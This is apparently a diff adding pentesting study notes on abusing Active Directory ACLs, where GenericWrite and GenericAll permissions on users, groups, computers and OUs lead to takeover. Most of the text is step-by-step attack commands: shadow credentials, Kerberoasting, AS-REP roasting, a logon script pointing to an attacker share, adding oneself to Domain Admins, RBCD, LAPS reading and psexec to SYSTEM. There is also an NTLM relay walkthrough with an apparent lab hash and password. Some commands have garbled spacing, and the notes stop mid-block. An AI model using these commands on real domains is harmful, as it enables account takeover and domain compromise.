+<li>❌ <strong>Access is Denied</strong>, even though Andrew is part of Group A (which is allowed in ACE 2).</li>
+</ol>
+<blockquote>
+<p>Why? Because the Deny ACE appears first and directly targets Andrew.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h4 id="thread-b-jane-tries-to-access-the-object"><strong>Thread B (Jane) Tries to Access the Object</strong></h4>
+<ol type="1">
+<li><p>Jane is not denied explicitly.</p></li>
+<li><p>HE is a member of <strong>Group A</strong>, and ACE 2 allows write access to Group A.</p></li>
+<li><p>ACE 3 also gives Everyone read/execute. So a member of Group A has all the permissions</p></li>
+<li><p>✅ <strong>Access is Allowed</strong>.</p></li>
+</ol>
+<hr />
+<h3 id="key-takeaways-from-this-image">⚠️ <strong>Key Takeaways from This Image</strong></h3>
+<ul>
+<li><p><strong>Access Tokens</strong> represent user identity and groups.</p></li>
+<li><p><strong>DACLs</strong> contain ACEs that define who can access the object.</p></li>
+<li><p><strong>“Deny” entries override “Allow” entries</strong>.</p></li>
+<li><p><strong>Evaluation stops at the first applicable ACE</strong>.</p></li>
+<li><p><strong>Order of ACEs in the DACL matters</strong>.</p></li>
+</ul>
+<hr />
+<h4 id="commands">Commands:</h4>
+<p><strong>Get the ACLs associated with the specified object:</strong></p>
+<p><code>Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs</code></p>
+<p>The <code>-ResolveGUIDs</code> flag tells PowerView to <strong>translate security GUIDs</strong> (which represent permissions) into <strong>human-readable names</strong>.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<hr />
+<hr />
+<h4 id="what-is-an-acl-access-control-list">🛡️ <strong>What is an ACL (Access Control List)?</strong></h4>
+<p><strong>✅ Definition:</strong></p>
+<p>An <strong>ACL</strong> is a <strong>list of permissions</strong> attached to an object (like a user, group, OU, computer, etc.) that defines <strong>who can do what</strong> with that object.</p>
+<p><strong>🧠 Think of it as:</strong></p>
+<blockquote>
+<p>“This object has a list of rules — and each rule says who can perform which actions.”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>There are <strong>two types</strong> of ACLs:</p>
+<ol type="1">
+<li><p><strong>DACL</strong> (Discretionary Access Control List)</p></li>
+<li><p><strong>SACL</strong> (System Access Control List)</p></li>
+</ol>
+<p>Note:- ACL is part of <strong>Security Descriptors</strong></p>
+<hr />
+<h4 id="what-is-an-ace-access-control-entry">🎟️ <strong>What is an ACE (Access Control Entry)?</strong></h4>
+<p><strong>✅ Definition:</strong></p>
+<p>An <strong>ACE</strong> is a <strong>single rule</strong> inside an ACL. It defines <strong>a specific permission</strong> granted (or denied) to a <strong>security principal</strong> (user, group, computer, etc.).</p>
+<p><strong>🧠 Think of it as:</strong></p>
+<blockquote>
+<p>“One entry in the rulebook saying: User Alice can ResetPassword on Object X.”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="acl-vs-ace-visual-analogy">🧱 <strong>ACL vs ACE – Visual Analogy</strong></h4>
+<div class="line-block">Concept | Real-World Analogy |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>ACL</strong> | A guest list for a party |</div>
+<div class="line-block"><strong>ACE</strong> | One line on that list: <em>“John is allowed to enter the VIP room”</em> |</div>
+<hr />
+<h4 id="in-active-directory">🧰 <strong>In Active Directory:</strong></h4>
+<p>Every AD object has a <strong>Discretionary Access Control List (DACL)</strong> that contains multiple <strong>ACEs</strong>.</p>
+<p><strong>🧠 Example (User Object):</strong></p>
+<pre><code>
+Object: User = John.Doe
+
+ACL:
+
+  ACE 1: Group &quot;Domain Admins&quot; → Full Control
+
+  ACE 2: User &quot;Alice&quot; → ResetPassword
+
+  ACE 3: User &quot;Bob&quot; → WriteProperty (ServicePrincipalName)
+</code></pre>
+<hr />
+<h4 id="why-are-acls-aces-important-in-pentesting">🔥 <strong>Why are ACLs &amp; ACEs Important in Pentesting?</strong></h4>
+<ul>
+<li>Attackers can <strong>abuse misconfigured ACEs</strong> to:
+<ul>
+<li>🧑‍💻 <strong>Reset another user’s password</strong></li>
+<li>🛠️ <strong>Change SPNs and perform Kerberoasting</strong></li>
+<li>📌 <strong>Take ownership of an object</strong></li>
+<li>🧬 <strong>Replicate domain secrets (DCsync attack)</strong></li>
+</ul></li>
+</ul>
+<h4 id="common-abuse-scenarios">📍 Common Abuse Scenarios:</h4>
+<div class="line-block">ACE Type | Abusable Permission | Attack |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><code>GenericWrite</code> | Modify user/computer object | Add SPN, reset password |</div>
+<div class="line-block"><code>WriteOwner</code> | Change object owner | Become object owner |</div>
+<div class="line-block"><code>WriteDacl</code> | Modify permissions | Grant yourself full access |</div>
+<div class="line-block"><code>ResetPassword</code> | Reset user’s password | Log in as them |</div>
+<div class="line-block"><code>Replicating Directory Changes</code> | Pull directory secrets | DCSync (hash dump) |</div>
+<hr />
+<h4 id="ace-types-you-should-watch-for-as-an-attacker">🔐 ACE Types You Should Watch For (as an Attacker)</h4>
+<div class="line-block">ACE Type | What It Lets You Do |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>GenericAll</code> | Full control – do anything |</div>
+<div class="line-block"><code>GenericWrite</code> | Modify most object attributes |</div>
+<div class="line-block"><code>WriteDACL</code> | Change object’s permissions |</div>
+<div class="line-block"><code>WriteOwner</code> | Change the owner of the object |</div>
+<div class="line-block"><code>ResetPassword</code> | Reset a user’s password |</div>
+<div class="line-block"><code>AllExtendedRights</code> | Includes DCSync privileges |</div>
+<hr />
+<h4 id="summary">🔚 Summary</h4>
+<div class="line-block">Term | Meaning | Key Point |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><strong>ACL</strong> | List of access control entries | Defines who can access an AD object |</div>
+<div class="line-block"><strong>ACE</strong> | A single permission rule in an ACL | Says <em>who</em> can do <em>what</em> to <em>whom</em> |</div>
+<div class="line-block"><strong>Why It Matters</strong> | Misconfigurations allow privilege escalation | Attackers look for exploitable ACEs to gain control |</div>
+<hr />
+<p>Would you like a <strong>visual map of an ACL attack path</strong>, or a <strong>lab-style demo on how to abuse ACEs with PowerView or BloodHound</strong>?</p>
+<h4 id="acl"><strong>ACL</strong></h4>
+<h2 id="genericwrite">🔐 GenericWrite</h2>
+<h4 id="what-is-genericwrite">📌 1. What is GenericWrite?</h4>
+<p>The <strong>GenericWrite</strong> permission in <strong>Active Directory</strong> allows a user to modify all writable attributes of an object, except for properties that require special permissions such as resetting passwords.</p>
+<p><strong>If an attacker gains GenericWrite over a user</strong>, they can write to the <strong>servicePrincipalNames</strong> attribute and immediately initiate a <strong>targeted Kerberoasting</strong> attack.</p>
+<p><strong>Moreover</strong>, having <strong>GenericWrite</strong> over a group enables them to add their account—or one they control—directly to that group, effectively escalating privileges.</p>
+<p><strong>Alternatively</strong>, if the attacker obtains <strong>GenericWrite</strong> over a computer object, they can modify the <strong>msds-KeyCredentialLink</strong> attribute. <strong>As a result</strong>, they create <strong>Shadow Credentials</strong> and authenticate as that computer account using <strong>Kerberos PKINIT</strong>.</p>
+<p><strong>GenericWrite</strong> = Permission to <strong>modify writable attributes</strong> of an AD object.</p>
+<p>👉 It does <strong>NOT give full control</strong>, but allows:</p>
+<ul>
+<li><p>Editing specific attributes (depends on object type)</p></li>
+<li><p>Indirect privilege escalation</p></li>
+</ul>
+<hr />
+<h4 id="prerequisites">🎯 2. Prerequisites</h4>
+<div class="line-block">Requirement | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain access | Valid domain user |</div>
+<div class="line-block">GenericWrite permission | On target object (user / group / computer) |</div>
+<div class="line-block">Reachability | LDAP / SMB / RPC to Domain Controller |</div>
+<div class="line-block">Target object exists | User / Group / Computer |</div>
+<hr />
+<h4 id="conditions-for-abuse">⚙️ 3. Conditions for Abuse</h4>
+<div class="line-block">Condition | Why Important |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Attribute must be writable | Not all attributes are |</div>
+<div class="line-block">Target not protected | AdminSDHolder may restrict |</div>
+<div class="line-block">Tool compatibility | PowerView / Impacket / BloodyAD |</div>
+<div class="line-block">Object type matters | Abuse differs (user vs group vs computer) |</div>
+<hr />
+<h4 id="abuse-based-on-object-type">🔥 4. Abuse Based on Object Type</h4>
+<p><strong>👤 A. GenericWrite on USER</strong></p>
+<p><strong>🧠 What you can modify</strong></p>
+<ul>
+<li><p><code>servicePrincipalName</code></p></li>
+<li><p><code>userAccountControl</code></p></li>
+<li><p><code>scriptPath</code></p></li>
+<li><p><code>msDS-KeyCredentialLink</code></p></li>
+</ul>
+<hr />
+<h4 id="attack-1-shadow-credentials-best-attack">⚔️ Attack 1: Shadow Credentials (Best Attack)</h4>
+<p><strong>📌 What it is</strong></p>
+<p>Abuse <code>msDS-KeyCredentialLink</code> to add your own authentication key.</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identity victim -Set @{&#39;msDS-KeyCredentialLink&#39;=$value}
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>You inject a <strong>certificate/key</strong></p></li>
+<li><p>AD trusts it for authentication</p></li>
+<li><p>No password needed</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Full account takeover</p>
+<hr />
+<h4 id="attack-2-spn-manipulation-kerberoasting">⚔️ Attack 2: SPN Manipulation → Kerberoasting</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Add fake SPN → request service ticket → crack password</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identityvictim -Set @{&#39;servicePrincipalName&#39;=&#39;fake/service&#39;}
+</code></pre>
+<pre><code>
+impacket-GetUserSPNs domain.local/user:pass-request
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>SPN makes account “service account”</p></li>
+<li><p>Kerberos gives encrypted ticket</p></li>
+<li><p>Offline cracking possible</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Recover plaintext password</p>
+<hr />
+<h4 id="attack-3-as-rep-roasting">⚔️ Attack 3: AS-REP Roasting</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Disable pre-authentication requirement</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identity victim -XOR @{&#39;userAccountControl&#39;=4194304}
+</code></pre>
+<pre><code>
+impacket-GetNPUsers domain.local/-no-pass
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>Removes Kerberos pre-auth</p></li>
+<li><p>DC sends encrypted response</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Crackable hash</p>
+<hr />
+<h4 id="attack-4-logon-script-injection">⚔️ Attack 4: Logon Script Injection</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Set malicious script path</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identity victim-Set @{&#39;scriptPath&#39;=&#39;\\attacker\share\evil.ps1&#39;}
+</code></pre>
+<hr />
+<h4 id="explanation">🧠 Explanation</h4>
+<ul>
+<li>Script runs when user logs in</li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Code execution as victim</p>
+<hr />
+<p><strong>⚠️ Password Reset?</strong></p>
+<p>❌ Not directly possible (in most cases)</p>
+<hr />
+<h4 id="b.-genericwrite-on-group">👥 B. GenericWrite on GROUP</h4>
+<hr />
+<p><strong>🧠 What you can modify</strong></p>
+<ul>
+<li><code>member</code> attribute (group membership)</li>
+</ul>
+<hr />
+<h4 id="attack-add-yourself-to-group">⚔️ Attack: Add Yourself to Group</h4>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Add-DomainGroupMember -Identity &quot;Domain Admins&quot; -Members attacker
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>You modify group membership</p></li>
+<li><p>No approval needed</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<div class="line-block">Target Group | Impact |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain Admins | 🚨 Full domain compromise |</div>
+<div class="line-block">Administrators | Local admin |</div>
+<div class="line-block">Remote Desktop Users | Lateral movement |</div>
+<hr />
+<h4 id="attack-flow">🔥 Attack Flow</h4>
+<pre><code>
+GenericWrite on Group
+
+        ↓
+
+Add yourself
+
+        ↓
+
+Inherit group privileges
+
+        ↓
+
+Privilege escalation
+</code></pre>
+<hr />
+<h4 id="c.-genericwrite-on-computer">💻 C. GenericWrite on COMPUTER</h4>
+<hr />
+<p><strong>🧠 What you can modify</strong></p>
+<ul>
+<li><p><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p></li>
+<li><p><code>servicePrincipalName</code></p></li>
+</ul>
+<hr />
+<h4 id="attack-1-rbcd-most-important">⚔️ Attack 1: RBCD (Most Important)</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Resource-Based Constrained Delegation</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre><code>
+Set-DomainObject-IdentityTARGET$-Set @{&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;=$attackerSID}
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ol type="1">
+<li><p>You allow your machine to act on behalf of users</p></li>
+<li><p>Use Kerberos delegation</p></li>
+<li><p>Impersonate Administrator</p></li>
+</ol>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 SYSTEM / Domain Admin access</p>
+<hr />
+<h4 id="attack-2-spn-abuse">⚔️ Attack 2: SPN Abuse</h4>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre><code>
+Set-DomainObject -Identity computer$ -Set @{&#39;servicePrincipalName&#39;=&#39;fake/service&#39;}
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<p>Same as user SPN abuse</p>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Extract machine hash</p>
+<hr />
+<h4 id="genericwrite-on-ou-requested">🔐 5. GenericWrite on OU (Requested)</h4>
+<hr />
+<p><strong>📌 What is it?</strong></p>
+<p>GenericWrite on OU = You can modify <strong>attributes of OU</strong></p>
+<p>👉 But:</p>
+<ul>
+<li><p>You <strong>cannot directly control users</strong></p></li>
+<li><p>You must abuse <strong>inheritance / permissions</strong></p></li>
+</ul>
+<hr />
+<p><strong>🎯 Goal</strong></p>
+<p>👉 Gain control over objects inside OU (users / groups)</p>
+<hr />
+<h4 id="abuse-method-grant-yourself-rights-on-ou">⚙️ Abuse Method: Grant Yourself Rights on OU</h4>
+<hr />
+<p><strong>⚔️ Step 1 — Modify OU ACL</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity &quot;OU=IT,DC=domain,DC=local&quot; -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<hr />
+<p><strong>🧠 What this does</strong></p>
+<p>👉 You are:</p>
+<pre><code>
+Giving yourself FullControl on the OU
+
+        ↓
+
+Permissions will be inherited by child objects (if inheritance applies)
+</code></pre>
+<hr />
+<h4 id="important-condition">⚠️ Important Condition</h4>
+<p>✔ Works only if:</p>
+<ul>
+<li><p>Inheritance is enabled</p></li>
+<li><p>Objects inherit permissions from OU</p></li>
+</ul>
+<hr />
+<h4 id="step-2-abuse-child-objects">⚔️ Step 2 — Abuse Child Objects</h4>
+<p>Now you can:</p>
+<h4 id="reset-user-passwords">Reset user passwords</h4>
+<pre><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<h4 id="add-yourself-to-groups">Add yourself to groups</h4>
+<pre><code>
+Add-DomainGroupMember -Identity &quot;Admins&quot; -Members attacker
+</code></pre>
+<hr />
+<h4 id="full-attack-flow">🔥 Full Attack Flow</h4>
+<pre><code>
+GenericWrite on OU
+
+        ↓
+
+Modify OU ACL (give yourself control)
+
+        ↓
+
+Permissions propagate to users/groups
+
+        ↓
+
+Control child objects
+
+        ↓
+
+Privilege escalation
+</code></pre>
+<h4 id="summary-table">📊 5. Summary Table</h4>
+<div class="line-block">Object | Technique | Impact |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">User | Shadow Credentials | 🚨 Full takeover |</div>
+<div class="line-block">User | SPN → Kerberoast | Password crack |</div>
+<div class="line-block">User | AS-REP Roast | Hash extraction |</div>
+<div class="line-block">User | Logon Script | Code execution |</div>
+<div class="line-block">Group | Add member | 🚨 Privilege escalation |</div>
+<div class="line-block">Computer | RBCD | 🚨 SYSTEM / DA |</div>
+<div class="line-block">Computer | SPN abuse | Hash cracking |</div>
+<hr />
+<h4 id="risks-impact">🚨 6. Risks / Impact</h4>
+<div class="line-block">Risk | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Privilege escalation | Add yourself to admin groups |</div>
+<div class="line-block">Credential theft | Kerberoasting / AS-REP |</div>
+<div class="line-block">Persistence | Shadow credentials |</div>
+<div class="line-block">Lateral movement | RBCD / group abuse |</div>
+<div class="line-block">Stealth access | No password reset needed |</div>
+<hr />
+<h4 id="logs-detection">🪵 7. Logs &amp; Detection</h4>
+<div class="line-block">Event ID | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">5136 | Directory object modified |</div>
+<div class="line-block">4728 | User added to group |</div>
+<div class="line-block">4769 | Kerberos service ticket (SPN abuse) |</div>
+<div class="line-block">4768 | AS-REP requests |</div>
+<hr />
+<h4 id="key-takeaway">💡 8. Key Takeaway</h4>
+<p>👉 <strong>GenericWrite = Attribute abuse, not direct control</strong></p>
+<h3 id="ntml-relay-attack-rbcd-linux-poc">NTML Relay Attack + RBCD ( Linux PoC )</h3>
+<pre class="powershell"><code>
+**#WEB01 - 10.129.1.166** 
+
+clocksync 10.129.1.166 -c &quot;netexec ldap 10.129.1.166 -u ms01$ -p ms01 -M maq -k&quot;
+
+clocksync 10.129.1.217 -c &quot;evil-winrm -i 192.168.100.2 -u gMSA_ADFS_prod$ -H fd9ea7ac7820dba5155bd6ed2d850c09&quot;
+
+gMSA_ADFS_prod$ : fd9ea7ac7820dba5155bd6ed2d850c09
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<pre class="bash"><code>
+python3 Coercer.py coerce -l 10.10.16.60 -t 192.168.100.2 -d pirate.htb -u &#39;gMSA_ADFS_prod$&#39; --hashes &#39;:fd9ea7ac7820dba5155bd6ed2d850c09&#39; --always-continue
+
+impacket-ntlmrelayx \
+
+-t ldaps://10.129.1.217 \
+
+--delegate-access \
+
+--no-da -smb2support \
+
+--remove-mic \
+
+--debug 
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<pre class="bash"><code>
+clocksync 10.129.1.217 -c &quot;nxc ldap 10.129.1.217 -u ms01$ -p ms01 --computers -k&quot; 
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<pre class="bash"><code>
+clocksync 10.129.1.217 -c &#39;impacket-getST pirate.htb/SWJFVMVD$:jD3U@VgYfz+Wj}&gt; -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.1.217&#39;
+
+clocksync 10.129.1.172 -c &#39;impacket-getST pirate.htb/SWJFVMVD$:jD3U@VgYfz+Wj}&gt; -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.1.172&#39;
+
+export KRB5CCNAME=Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
+
+env | grep KRB  
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<pre class="bash"><code>
+clocksync 10.129.1.172 -c &quot;evil-winrm -i WEB01.pirate.htb -r PIRATE.HTB&quot;
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h2 id="generic-all">Generic All</h2>
+<h4 id="what-is-genericall">📌 1. What is GenericAll?</h4>
+<p><strong>GenericAll</strong> = <strong>Full control over an AD object</strong></p>
+<p>👉 You can:</p>
+<ul>
+<li><p>Read all attributes</p></li>
+<li><p>Modify all attributes</p></li>
+<li><p>Change permissions (ACL)</p></li>
+<li><p>Perform sensitive operations (like password reset)</p></li>
+</ul>
+<hr />
+<h4 id="prerequisites-1">🎯 2. Prerequisites</h4>
+<div class="line-block">Requirement | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain access | Valid domain user |</div>
+<div class="line-block">GenericAll permission | On target object |</div>
+<div class="line-block">Network access | LDAP / SMB / RPC to DC |</div>
+<div class="line-block">Target object | User / Group / Computer / OU |</div>
+<hr />
+<h4 id="conditions-for-abuse-1">⚙️ 3. Conditions for Abuse</h4>
+<div class="line-block">Condition | Why Important |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Object type matters | Abuse differs |</div>
+<div class="line-block">AdminSDHolder protection | May restrict changes |</div>
+<div class="line-block">Privileged target | Determines impact |</div>
+<div class="line-block">Inheritance (OU) | Can affect multiple objects |</div>
+<hr />
+<h4 id="abuse-based-on-object-type-1">🔥 4. Abuse Based on Object Type</h4>
+<hr />
+<h4 id="a.-genericall-on-user">👤 A. GenericAll on USER</h4>
+<hr />
+<p><strong>🧠 What you control</strong></p>
+<p>👉 Everything:</p>
+<ul>
+<li><p>Password</p></li>
+<li><p>SPNs</p></li>
+<li><p>UAC flags</p></li>
+<li><p>ACLs</p></li>
+<li><p>Authentication methods</p></li>
+</ul>
+<hr />
+<h4 id="attack-1-reset-password-most-direct">⚔️ Attack 1: Reset Password (MOST DIRECT)</h4>
+<p><strong>⚙️ Steps</strong></p>
+<pre><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot;-AsPlainText-Force)
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>GenericAll includes <code>ResetPassword</code></p></li>
+<li><p>No old password required</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Instant account takeover</p>
+<h4 id="attack-2-shadow-credentials-best-attack">⚔️ Attack 2: Shadow Credentials (Best Attack)</h4>
+<p><strong>📌 What it is</strong></p>
+<p>Abuse <code>msDS-KeyCredentialLink</code> to add your own authentication key.</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identity victim -Set @{&#39;msDS-KeyCredentialLink&#39;=$value}
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>You inject a <strong>certificate/key</strong></p></li>
+<li><p>AD trusts it for authentication</p></li>
+<li><p>No password needed</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Full account takeover</p>
+<h4 id="attack-3-spn-manipulation-kerberoasting">⚔️ Attack 3: SPN Manipulation → Kerberoasting</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Add fake SPN → request service ticket → crack password</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identityvictim -Set @{&#39;servicePrincipalName&#39;=&#39;fake/service&#39;}
+</code></pre>
+<pre><code>
+impacket-GetUserSPNs domain.local/user:pass-request
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>SPN makes account “service account”</p></li>
+<li><p>Kerberos gives encrypted ticket</p></li>
+<li><p>Offline cracking possible</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Recover plaintext password</p>
+<hr />
+<h4 id="attack-4-as-rep-roasting">⚔️ Attack 4: AS-REP Roasting</h4>
+<hr />
+<p><strong>📌 What it is</strong></p>
+<p>Disable pre-authentication requirement</p>
+<hr />
+<p><strong>⚙️ Steps</strong></p>
+<pre class="powershell"><code>
+Set-DomainObject -Identity victim -XOR @{&#39;userAccountControl&#39;=4194304}
+</code></pre>
+<pre><code>
+impacket-GetNPUsers domain.local/-no-pass
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li><p>Removes Kerberos pre-auth</p></li>
+<li><p>DC sends encrypted response</p></li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Crackable hash</p>
+<hr />
+<h4 id="attack-5-grant-yourself-more-rights">⚔️ Attack 5: Grant Yourself More Rights</h4>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Persistence / stealth control</p>
+<hr />
+<h4 id="b.-genericall-on-group">👥 B. GenericAll on GROUP</h4>
+<hr />
+<p><strong>🧠 What you control</strong></p>
+<ul>
+<li><p>Membership</p></li>
+<li><p>Group permissions</p></li>
+<li><p>Attributes</p></li>
+</ul>
+<hr />
+<h4 id="attack-1-add-yourself-to-group">⚔️ Attack 1: Add Yourself to Group</h4>
+<pre><code>
+Add-DomainGroupMember -Identity &quot;Domain Admins&quot; -Members attacker
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li>Full control → modify <code>member</code> attribute</li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<div class="line-block">Group | Impact |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain Admins | 🚨 Full domain compromise |</div>
+<div class="line-block">Administrators | Local admin |</div>
+<div class="line-block">Custom privileged group | Priv esc |</div>
+<h4 id="c.-genericall-on-computer">💻 C. GenericAll on COMPUTER</h4>
+<hr />
+<h4 id="attack-1-rbcd-most-powerful">⚔️ Attack 1: RBCD (Most Powerful)</h4>
+<pre><code>
+Set-DomainObject -Identity TARGET$ -Set @{&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;=$attackerSID}
+</code></pre>
+<hr />
+<p><strong>🧠 Explanation</strong></p>
+<ul>
+<li>Allow your machine to impersonate users</li>
+</ul>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 SYSTEM / Domain Admin access</p>
+<hr />
+<h4 id="attack-2-reset-machine-password">⚔️ Attack 2: Reset Machine Password</h4>
+<pre><code>
+net user TARGET$ NewPass123!/domain
+</code></pre>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Control computer account</p>
+<hr />
+<h4 id="attack-3-spn-abuse">⚔️ Attack 3: SPN Abuse</h4>
+<pre><code>
+Set-DomainObject -Identity TARGET$ -Set @{&#39;servicePrincipalName&#39;=&#39;fake/service&#39;}
+</code></pre>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Kerberoasting</p>
+<h4 id="abuse-path-2-laps-abuse-very-important">⚔️ 4. Abuse Path 2: LAPS Abuse (VERY IMPORTANT)</h4>
+<hr />
+<p><strong>🧠 What is LAPS?</strong></p>
+<blockquote>
+<p><strong>LAPS = Local Administrator Password Solution</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<ul>
+<li>Stores <strong>local admin password</strong> in AD attribute:</li>
+</ul>
+<pre><code>
+ms-Mcs-AdmPwd
+</code></pre>
+<hr />
+<p><strong>🔐 Normally</strong></p>
+<ul>
+<li>Only privileged users can read it</li>
+</ul>
+<hr />
+<p><strong>🔥 With GenericAll</strong></p>
+<p>👉 You can:</p>
+<ul>
+<li>Grant yourself permission to read LAPS password</li>
+</ul>
+<hr />
+<p><strong>⚙️ Step 1: Give yourself read access</strong></p>
+<pre class="powershell"><code>
+Add-DomainObjectAcl -TargetIdentity TARGET$ -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<hr />
+<p><strong>⚙️ Step 2: Read LAPS password</strong></p>
+<pre><code>
+Get-DomainComputer TARGET$ -Propertie sms-Mcs-AdmPwd
+
+Name              : TARGET
+
+ms-Mcs-AdmPwd     : P@ssw0rd123!
+</code></pre>
+<p><strong>💥 Impact</strong></p>
+<pre><code>
+You now have:
+
+Local Administrator credentials on TARGET machine
+</code></pre>
+<hr />
+<p><strong>⚔️ Step 3: Use it</strong></p>
+<pre><code>
+psexec \\TARGET -u Administrator -p P@ssw0rd123! cmd.exe
+
+NT AUTHORITY\SYSTEM shell
+</code></pre>
+<p><strong>🔥 Why LAPS Abuse is Powerful</strong></p>
+<pre><code>
+GenericAll → Read LAPS → Local Admin → SYSTEM → Credential Dump
+</code></pre>
+<h4 id="d.-genericall-on-ou-very-important-final-version">🗂️ D. GenericAll on OU (VERY IMPORTANT — FINAL VERSION)</h4>
+<hr />
+<p><strong>🧠 What you control</strong></p>
+<p>👉 If you have <strong>GenericAll on an OU</strong>, you control:</p>
+<pre><code>
+The OU object itself (FULL CONTROL)
+</code></pre>
+<p>👉 Since an OU is a <strong>container</strong>, it holds:</p>
+<ul>
+<li><p>Users</p></li>
+<li><p>Groups</p></li>
+<li><p>Computers</p></li>
+</ul>
+<hr />
+<h4 id="core-logic-most-important">🔥 Core Logic (MOST IMPORTANT)</h4>
+<pre><code>
+OU = container
+
+Objects inside OU = child objects
+
+Permissions on OU
+
+        ↓ (inheritance)
+
+Flow to child objects
+</code></pre>
+<p>👉 So:</p>
+<pre><code>
+GenericAll on OU
+
+        ↓
+
